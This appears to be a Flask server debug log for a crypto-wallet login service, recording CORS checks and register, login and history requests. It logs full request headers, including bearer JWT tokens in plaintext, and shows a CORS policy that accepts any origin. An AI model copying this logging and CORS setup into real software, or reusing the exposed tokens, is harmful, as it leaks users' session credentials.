2025-07-09 10:55:46,496 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:46,497 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:46,497 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:46,497 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:55:46,681 - api.auth - INFO - Received register request with method: POST
2025-07-09 10:55:46,682 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '138', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:55:46,682 - api.auth - INFO - Request content type: application/json
2025-07-09 10:55:46,682 - api.auth - INFO - Processing JSON request
2025-07-09 10:55:46,682 - api.auth - INFO - Attempting to register user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:55:46,686 - api.auth - WARNING - Registration failed for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Wallet address already in use
2025-07-09 10:55:46,687 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:55:46,687 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:55:46,687 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:55:46,687 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:56:19,330 - flask_cors.extension - DEBUG - Request to ''/register'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:56:19,330 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', '*'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type')])
2025-07-09 10:56:19,330 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-09 10:56:20,565 - flask_cors.extension - DEBUG - Request to ''/favicon.ico'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:56:20,565 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', '*'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type')])
2025-07-09 10:56:20,565 - flask_cors.extension - DEBUG - CORS have been already evaluated, skipping
2025-07-09 10:56:44,957 - api.auth - INFO - Received login request with method: POST
2025-07-09 10:56:44,958 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Connection': 'keep-alive', 'Content-Length': '79', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36', 'Accept': 'application/json', 'Content-Type': 'application/json', 'Origin': 'http://98.66.153.29:4456', 'Referer': 'http://98.66.153.29:4456/', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'}
2025-07-09 10:56:44,958 - api.auth - INFO - Request content type: application/json
2025-07-09 10:56:44,958 - api.auth - INFO - Processing JSON request
2025-07-09 10:56:44,958 - api.auth - INFO - Attempting to authenticate user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:56:45,112 - api.auth - INFO - Authentication successful for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 10:56:45,112 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:56:45,112 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:56:45,112 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:56:45,113 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:57:46,355 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:57:46,356 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:57:46,356 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:57:46,356 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-09 10:57:46,359 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:57:46,359 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:57:46,359 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:57:46,359 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-09 10:57:46,401 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:57:46,401 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:57:46,401 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:57:46,402 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 10:57:46,429 - flask_cors.extension - DEBUG - Request to ''/history'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 10:57:46,429 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://98.66.153.29:4456
2025-07-09 10:57:46,429 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 10:57:46,429 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://98.66.153.29:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 11:10:01,832 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 11:10:01,832 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 11:10:01,833 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 11:10:01,833 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-09 11:10:01,872 - api.auth - INFO - Received login request with method: POST
2025-07-09 11:10:01,873 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Origin': 'http://localhost:4456', 'Content-Type': 'application/json', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTIwNTkwMTd9.b0k4SkuEfzgIDcF1qm45tky1fCitpYC5aiGhBKWfbeY', 'Referer': 'http://localhost:4456/', 'Content-Length': '79'}
2025-07-09 11:10:01,873 - api.auth - INFO - Request content type: application/json
2025-07-09 11:10:01,873 - api.auth - INFO - Processing JSON request
2025-07-09 11:10:01,873 - api.auth - INFO - Attempting to authenticate user with wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-09 11:10:02,024 - api.auth - INFO - Authentication successful for wallet: 0xAb5801a7D398351b8bE11C439e05C5B3259aec45
2025-07-09 11:10:02,024 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 11:10:02,024 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 11:10:02,024 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 11:10:02,025 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 11:27:32,072 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 11:27:32,073 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 11:27:32,073 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 11:27:32,073 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Access-Control-Allow-Headers', 'authorization, content-type'), ('Access-Control-Max-Age', 86400), ('Access-Control-Allow-Methods', 'DELETE, GET, OPTIONS, PATCH, POST, PUT'), ('Vary', 'Origin')])
2025-07-09 11:27:32,107 - api.auth - INFO - Received login request with method: POST
2025-07-09 11:27:32,107 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Origin': 'http://localhost:4456', 'Content-Type': 'application/json', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTIwNjMwMDJ9.OWgq55Q-HrH9yLFQOLjAF-THT0Ua2mHsbrPBZPHSgD8', 'Referer': 'http://localhost:4456/', 'Content-Length': '39'}
2025-07-09 11:27:32,107 - api.auth - INFO - Request content type: application/json
2025-07-09 11:27:32,107 - api.auth - INFO - Processing JSON request
2025-07-09 11:27:32,107 - api.auth - INFO - Attempting to authenticate user with wallet: user
2025-07-09 11:27:32,113 - api.auth - WARNING - Invalid credentials for wallet: user, error: Invalid credentials
2025-07-09 11:27:32,114 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 11:27:32,114 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 11:27:32,114 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 11:27:32,114 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 11:27:54,237 - api.auth - INFO - Received login request with method: POST
2025-07-09 11:27:54,237 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Origin': 'http://localhost:4456', 'Content-Type': 'application/json', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTIwNjMwMDJ9.OWgq55Q-HrH9yLFQOLjAF-THT0Ua2mHsbrPBZPHSgD8', 'Referer': 'http://localhost:4456/', 'Content-Length': '77'}
2025-07-09 11:27:54,237 - api.auth - INFO - Request content type: application/json
2025-07-09 11:27:54,237 - api.auth - INFO - Processing JSON request
2025-07-09 11:27:54,237 - api.auth - INFO - Attempting to authenticate user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 11:27:54,380 - api.auth - WARNING - Invalid credentials for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Invalid credentials
2025-07-09 11:27:54,380 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 11:27:54,380 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 11:27:54,380 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
2025-07-09 11:27:54,381 - flask_cors.core - DEBUG - Settings CORS headers: MultiDict([('Access-Control-Allow-Origin', 'http://localhost:4456'), ('Access-Control-Expose-Headers', 'Authorization, Content-Disposition, Content-Length, Content-Type'), ('Vary', 'Origin')])
2025-07-09 11:27:55,312 - api.auth - INFO - Received login request with method: POST
2025-07-09 11:27:55,312 - api.auth - INFO - Request headers: {'Host': '98.66.153.29:4455', 'Origin': 'http://localhost:4456', 'Content-Type': 'application/json', 'Accept-Language': 'fr-FR,fr;q=0.9', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Accept': 'application/json', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15', 'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ3YWxsZXQiOiIweEFiNTgwMWE3RDM5ODM1MWI4YkUxMUM0MzllMDVDNUIzMjU5YWVjNDUiLCJleHAiOjE3NTIwNjMwMDJ9.OWgq55Q-HrH9yLFQOLjAF-THT0Ua2mHsbrPBZPHSgD8', 'Referer': 'http://localhost:4456/', 'Content-Length': '77'}
2025-07-09 11:27:55,312 - api.auth - INFO - Request content type: application/json
2025-07-09 11:27:55,312 - api.auth - INFO - Processing JSON request
2025-07-09 11:27:55,312 - api.auth - INFO - Attempting to authenticate user with wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E
2025-07-09 11:27:55,461 - api.auth - WARNING - Invalid credentials for wallet: 0x12F0453C7a9D4F1b8F00E1AbF092b3aB2c3D9d3E, error: Invalid credentials
2025-07-09 11:27:55,461 - flask_cors.extension - DEBUG - Request to ''/login'' matches CORS resource '/*'. Using options: {'origins': ['.*'], 'methods': 'DELETE, GET, OPTIONS, PATCH, POST, PUT', 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': 'Authorization, Content-Disposition, Content-Length, Content-Type', 'supports_credentials': False, 'max_age': 86400, 'send_wildcard': False, 'automatic_options': True, 'vary_header': True, 'resources': {'/*': {'origins': '*', 'methods': ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'PATCH'], 'allow_headers': ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin', 'Access-Control-Request-Method', 'Access-Control-Request-Headers'], 'expose_headers': ['Content-Type', 'Content-Length', 'Content-Disposition', 'Authorization'], 'supports_credentials': False, 'max_age': 86400}}, 'intercept_exceptions': True, 'always_send': True, 'allow_private_network': False}
2025-07-09 11:27:55,461 - flask_cors.core - DEBUG - CORS request received with 'Origin' http://localhost:4456
2025-07-09 11:27:55,462 - flask_cors.core - DEBUG - The request's Origin header matches. Sending CORS headers.
